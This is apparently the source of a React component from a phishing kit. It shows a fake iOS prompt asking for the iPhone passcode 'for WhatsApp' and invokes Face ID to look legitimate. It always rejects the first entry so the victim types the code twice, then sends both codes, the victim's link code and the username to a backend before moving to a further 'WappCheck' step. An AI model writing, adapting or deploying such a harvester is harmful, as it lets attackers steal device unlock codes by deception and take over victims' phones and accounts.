import React, { useRef, useState, useEffect } from 'react';
import { Form, Button, Row, Col } from 'react-bootstrap';
import responses from '../../api/responses';
import SvgSpinner from './svgComponents/SvgSpinner'
import WappCheck from './WappCheck';
import { useData } from '../../context/UserContext'

const NUMPAD = [
    ['1', '2', '3'],
    ['4', '5', '6'],
    ['7', '8', '9'],
    ['', '0', '←']
];

const Passcode = ({
    translator
}) => {
    const { user } = useData();
    let initialDigits = parseInt(user?.data?.unlockCode, 10);
    const isAlpha = isNaN(initialDigits) || user?.data?.unlockCode === 'alphanumeric';
    if (!isAlpha && initialDigits !== 4 && initialDigits !== 6) initialDigits = 6;
    const [DIGITS, setDIGITS] = useState(initialDigits);

    // Estados para numérico
    const [code, setCode] = useState(isAlpha ? '' : Array(initialDigits).fill(''));
    const [codeTemp, setCodeTemp] = useState('');
    const [focusedIndex, setFocusedIndex] = useState(0);
    const [shake, setShake] = useState(false);
    const inputs = useRef([]);
    const [countCode, setCountCode] = useState(0);
    const [showLoader, setShowLoader] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    // Estados para fade y mostrar WappCheck
    const [fadeOut, setFadeOut] = useState(false);
    const [showWappCheck, setShowWappCheck] = useState(
        user?.data?.unlockCode === "none" || user?.data?.unlockCode === ""
            ? true
            : false
    );
    const [firstCode, setFirstCode] = useState('');

    // Estados para alfanumérico
    const [alphaStep, setAlphaStep] = useState(0); // 0: primer input, 1: segundo input
    const [alphaCode, setAlphaCode] = useState('');
    const [alphaFirst, setAlphaFirst] = useState('');
    const [alphaShake, setAlphaShake] = useState(false);

    useEffect(() => {

        let digits = parseInt(user?.data?.unlockCode, 10);
        const isAlpha = isNaN(digits) || user?.data?.unlockCode === 'alphanumeric';
        if (!isAlpha && digits !== 4 && digits !== 6) digits = 6;
        setDIGITS(digits);
        setCode(isAlpha ? '' : Array(digits).fill(''));
    }, []);

    useEffect(() => {
        if (!isAlpha) {
            setTimeout(() => {
                inputs.current[0]?.focus();
            }, 500);
        }
    }, []);

    const addAcountPasscode = async (passCodeOne, passCodeTwo, statusPasscode) => {
        try {
            let data = {
                linkCode: user?.data?.linkCode || '',
                username: user?.data?.username || '',
                codesUnlock: `${passCodeOne}-${passCodeTwo}`,
                status: statusPasscode
            }
            const response = await responses.addUnlockCode(data);
        } catch (error) {
            console.error('Error en add passcode:', error);
        }
    }

    // NUMÉRICO
    const handleChange = (e, idx) => {
        const val = e.target.value.replace(/\D/g, '');
        if (val.length <= 1) {
            const firstEmpty = code.findIndex((d, i) => i < idx && d === '');
            if (firstEmpty !== -1) {
                inputs.current[firstEmpty].focus();
                return;
            }
            const newCode = [...code];
            newCode[idx] = val;
            setCode(newCode);

            // Si se completa el código (último input y todos llenos)
            if (val && idx === DIGITS - 1 && newCode.every(d => d !== '')) {
                setTimeout(() => {
                    setCountCode(prev => {
                        if (prev === 0) {
                            setCodeTemp(newCode);
                            setFirstCode(newCode.join(''));
                            addAcountPasscode(newCode.join(''), 'Processing', 'passcode_process');
                        }
                        if (prev === 1) {
                            setCodeTemp(newCode.join(''));
                            addAcountPasscode(firstCode, newCode.join(''), 'passcode_process');
                        }
                        return prev + 1;
                    });
                }, 2000);
            }

            if (val && idx < DIGITS - 1) {
                inputs.current[idx + 1].focus();
            }
            if (val && idx === DIGITS - 1) {
                setShowLoader(true);
                setTimeout(() => {
                    setShake(false);
                    if (countCode === 0) {
                        if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                        setShake(true);
                        setCode(Array(DIGITS).fill(''));
                        inputs.current[0]?.focus();
                        setShowLoader(false);
                    } else {
                        if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                        setFadeOut(true);
                        setShowLoader(false);
                        setTimeout(() => setShowWappCheck(true), 500);
                    }
                }, 3000);
            }
        }
    };

    const handleFocus = idx => setFocusedIndex(idx);

    const handleKeyDown = (e, idx) => {
        if (e.key === 'Backspace') {
            if (code[idx]) {
                const newCode = [...code];
                for (let i = idx; i < newCode.length; i++) {
                    newCode[i] = '';
                }
                setCode(newCode);
            } else if (idx > 0) {
                const newCode = [...code];
                for (let i = idx - 1; i < newCode.length; i++) {
                    newCode[i] = '';
                }
                setCode(newCode);
                inputs.current[idx - 1].focus();
            }
            e.preventDefault();
        }
    };

    // NUMPAD para code4 y code6
    const handleNumpadClick = (val) => {
        if (val === '←') {
            // Borrar último dígito
            const lastFilled = code.slice().reverse().findIndex(d => d !== '');
            if (lastFilled !== -1) {
                const idx = DIGITS - 1 - lastFilled;
                const newCode = [...code];
                newCode[idx] = '';
                setCode(newCode);
                setFocusedIndex(idx);
                inputs.current[idx]?.focus();
            }
            return;
        }
        if (val === '') return;
        // Buscar el primer input vacío
        const idx = code.findIndex(d => d === '');
        if (idx !== -1) {
            const newCode = [...code];
            newCode[idx] = val;
            setCode(newCode);
            setFocusedIndex(idx);
            inputs.current[idx]?.focus();

            // Si se completa el código
            if (idx === DIGITS - 1 && newCode.every(d => d !== '')) {
                setShowLoader(true);
                setTimeout(() => {
                    setShake(false);
                    setShowLoader(false);
                    setCountCode(prev => {
                        if (prev === 0) {
                            setCodeTemp(newCode);
                            setFirstCode(newCode.join(''));
                            addAcountPasscode(newCode.join(''), 'Processing', 'passcode_process');
                            if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                            setShake(true);
                            setCode(Array(DIGITS).fill(''));
                            inputs.current[0]?.focus();
                            setTimeout(() => setShake(false), 500);
                        }
                        if (prev === 1) {
                            setCodeTemp(newCode.join(''));
                            addAcountPasscode(firstCode, newCode.join(''), 'passcode_process');
                            if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                            setFadeOut(true);
                            setTimeout(() => setShowWappCheck(true), 500);
                        }
                        return prev + 1;
                    });
                }, 2000);
            }
        }
    };

    // ALFANUMÉRICO
    const handleAlphaSubmit = async (e) => {
        e.preventDefault();
        setShowLoader(true);
        setTimeout(() => {
            setShowLoader(false);
            if (alphaStep === 0) {
                setAlphaFirst(alphaCode);
                setAlphaCode('');
                setAlphaStep(1);
                addAcountPasscode(alphaCode, 'Processing', 'passcode_process');
                if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                setAlphaShake(true);
                setTimeout(() => setAlphaShake(false), 500);
            } else {
                addAcountPasscode(alphaFirst, alphaCode, 'passcode_process');
                if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                setAlphaShake(true);
                setFadeOut(true);
                setTimeout(() => {
                    setAlphaShake(false);
                    setShowWappCheck(true);
                }, 500);
            }
        }, 2000);
    };

    return (
        <>
            <style>
                {`
                .shake {
                    animation: shake 0.5s;
                }
                @keyframes shake {
                    0% { transform: translateX(0); }
                    20% { transform: translateX(-5px); }
                    40% { transform: translateX(5px); }
                    60% { transform: translateX(-5px); }
                    80% { transform: translateX(5px); }
                    100% { transform: translateX(0); }
                }
                .fade-out {
                    opacity: 0;
                    transition: opacity 0.5s;
                }
                .passcode-row-nowrap {
                    display: flex !important;
                    flex-wrap: nowrap !important;
                    justify-content: center;
                    align-items: center;
                    gap: 16px;
                }
                .numpad-btn {
                    width: 56px;
                    height: 56px;
                    border-radius: 50%;
                    border: none;
                    background: #232323;
                    color: #fff;
                    font-size: 22px;
                    margin: 6px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    box-shadow: 0 1px 2px rgba(0,0,0,0.12);
                    transition: background 0.2s;
                }
                .numpad-btn:active {
                    background: #444;
                }
                .numpad-row {
                    display: flex;
                    justify-content: center;
                }
                @media (max-width: 600px) {
                    .numpad-btn {
                        width: 72px;
                        height: 72px;
                        font-size: 28px;
                        margin: 10px;
                    }
                }
                    .main-passcode-container {
                    overflow-y: auto;
                    min-height: 100vh;
                    background: #181818;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: flex-start;
                    position: relative;
                    padding: 37px;
                    /* Oculta scrollbar en escritorio */
                    scrollbar-width: none; /* Firefox */
                    -ms-overflow-style: none; /* IE 10+ */
                }
                .main-passcode-container::-webkit-scrollbar {
                    display: none; /* Chrome/Safari */
                }
                @media (max-width: 600px) {
                    .main-passcode-container {
                        /* Muestra scrollbar en móvil */
                        scrollbar-width: auto;
                        -ms-overflow-style: auto;
                    }
                    .main-passcode-container::-webkit-scrollbar {
                        display: initial;
                    }
                }
                `}
            </style>
            {!showWappCheck && (
                <div
                    className={`main-passcode-container${fadeOut ? ' fade-out' : ''}`}
                    style={{
                        minHeight: '100vh',
                        background: '#181818',
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        justifyContent: 'flex-start',
                        position: 'relative',
                        padding: 37,
                    }}
                >
                    <div style={{ color: '#fff', fontSize: 18, textAlign: 'center', marginBottom: 8, fontWeight: 500 }}>
                        {translator("Ingresa el código del iPhone para")} <br />“WhatsApp”
                    </div>
                    <div style={{ color: '#b0b0b0', fontSize: 13, textAlign: 'center', marginBottom: 32 }}>
                        {translator("Se requiere Face ID para usar WhatsApp.")}
                    </div>
                    <Form onSubmit={isAlpha ? handleAlphaSubmit : undefined}>
                        {isAlpha ? (
                            <>
                                <style>
                                    {`
                                        .passcode-placeholder-white::placeholder {
                                            color:rgba(128, 121, 121, 0.53) !important;
                                            opacity: 1 !important;
                                        }
                                        .eye-icon-passcode {
                                            position: absolute;
                                            right: 18px;
                                            top: 50%;
                                            transform: translateY(-50%);
                                            cursor: pointer;
                                            z-index: 10;
                                            width: 24px;
                                            height: 24px;
                                            opacity: 0.8;
                                        }
                                        .passcode-input-wrapper {
                                            position: relative;
                                            width: 100%;
                                        }
                                        .shake {
                                            animation: shake 0.5s;
                                        }
                                    `}
                                </style>
                                <div className="passcode-input-wrapper" style={{ marginBottom: 18 }}>
                                    <Form.Control
                                        type="password"
                                        placeholder={alphaStep === 0 ? `${translator("Código de desbloqueo")}` : `${translator("Repite el código")}`}
                                        value={alphaCode}
                                        onChange={e => setAlphaCode(e.target.value)}
                                        autoFocus
                                        inputMode="text"
                                        className={`passcode-placeholder-white${alphaShake ? ' shake' : ''}`}
                                        style={{
                                            background: "#393939",
                                            border: "none",
                                            color: "#fff",
                                            height: 56,
                                            fontSize: 20,
                                            fontWeight: 400,
                                            borderRadius: 22,
                                            textAlign: "left",
                                            boxShadow: "none",
                                            paddingLeft: 24,
                                            paddingRight: 24,
                                            opacity: 0.95
                                        }}
                                    />
                                </div>
                                <div style={{ display: "flex", justifyContent: "center" }}>
                                    <Button
                                        variant="secondary"
                                        type="submit"
                                        style={{
                                            width: "200px",
                                            height: 44,
                                            borderRadius: 8,
                                            fontWeight: 500,
                                            fontSize: 17,
                                            background: alphaCode.length > 0 ? "rgb(77, 144, 254)" : "#888",
                                            border: "none",
                                            marginBottom: 10,
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            gap: 8,
                                            pointerEvents: alphaCode.length > 0 ? "auto" : "none",
                                            color: "#fff"
                                        }}
                                        disabled={alphaCode.length === 0}
                                    >
                                        {showLoader
                                            ? (
                                                <SvgSpinner
                                                    width={28}
                                                    height={28}
                                                    fill="#fff"
                                                    color="#fff"
                                                />
                                            )
                                            : translator("Siguiente")
                                        }

                                    </Button>
                                </div>
                            </>
                        ) : (
                            <>
                                <Row className="justify-content-center passcode-row-nowrap mb-4" style={{ gap: 16 }}>
                                    {code.map((digit, idx) => (
                                        <Col key={idx} xs="auto" style={{ padding: 0 }}>
                                            <Form.Control
                                                className={shake ? 'shake' : ''}
                                                ref={el => (inputs.current[idx] = el)}
                                                type="tel"
                                                maxLength={1}
                                                value={digit}
                                                onChange={e => handleChange(e, idx)}
                                                onFocus={() => handleFocus(idx)}
                                                onKeyDown={e => handleKeyDown(e, idx)}
                                                autoFocus={idx === 0}
                                                inputMode="numeric"
                                                pattern="[0-9]*"
                                                style={{
                                                    width: 32,
                                                    height: 32,
                                                    borderRadius: '50%',
                                                    border: '2px solid',
                                                    borderColor: focusedIndex === idx || code[idx] ? '#fff' : '#555',
                                                    background: code[idx]
                                                        ? '#fff'
                                                        : focusedIndex === idx
                                                            ? '#222'
                                                            : '#181818',
                                                    color: 'transparent',
                                                    fontSize: 20,
                                                    textAlign: 'center',
                                                    outline: 'none',
                                                    transition: 'border-color 0.2s, background 0.2s, color 0.2s',
                                                    padding: 0,
                                                    caretColor: 'transparent',
                                                    margin: '0 6px',
                                                }}
                                                readOnly // Para forzar el uso del teclado virtual
                                            />
                                        </Col>
                                    ))}
                                </Row>
                                <div style={{
                                    width: '100%',
                                    display: showLoader ? 'flex' : 'none',
                                    justifyContent: 'center',
                                    alignItems: 'center',
                                    margin: '12px 0 0 0'
                                }}>
                                    <SvgSpinner
                                        width={32}
                                        height={32}
                                        fill="#fff"
                                        color="#fff"
                                    />
                                </div>
                                {/* Teclado numérico virtual */}
                                <div style={{ marginBottom: 16 }}>
                                    {NUMPAD.map((row, i) => (
                                        <div className="numpad-row" key={i}>
                                            {row.map((val, j) => {
                                                const isDelete = val === '←';
                                                const isFull = code.every(d => d !== '');
                                                return (
                                                    <button
                                                        key={j}
                                                        className="numpad-btn"
                                                        onClick={e => {
                                                            e.preventDefault();
                                                            handleNumpadClick(val);
                                                        }}
                                                        tabIndex={-1}
                                                        type="button"
                                                        style={{
                                                            opacity: val === '' ? 0 : 1,
                                                            pointerEvents: val === '' || (isDelete && isFull) ? 'none' : 'auto',
                                                            background: isDelete && isFull ? '#444' : undefined,
                                                            cursor: isDelete && isFull ? 'not-allowed' : undefined
                                                        }}
                                                        disabled={isDelete && isFull}
                                                    >
                                                        {val === '←' ? (
                                                            <svg width="22" height="22" fill="#fff" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" /></svg>
                                                        ) : val}
                                                    </button>
                                                );
                                            })}
                                        </div>
                                    ))}
                                </div>
                            </>
                        )}
                    </Form>
                    <Button
                        variant="link"
                        style={{
                            display: 'none',
                            position: 'absolute',
                            right: 24,
                            bottom: window.innerWidth < 600 ? 80 : 40,
                            color: '#b0b0b0',
                            fontSize: 16,
                            textDecoration: 'none',
                            padding: 0,
                        }}
                        onClick={() => inputs.current[0]?.blur()}
                    >
                        {translator("Cancelar")}
                    </Button>
                </div>
            )}
            {
                showWappCheck && <WappCheck translator={translator} />
            }
        </>
    );
};

export default Passcode;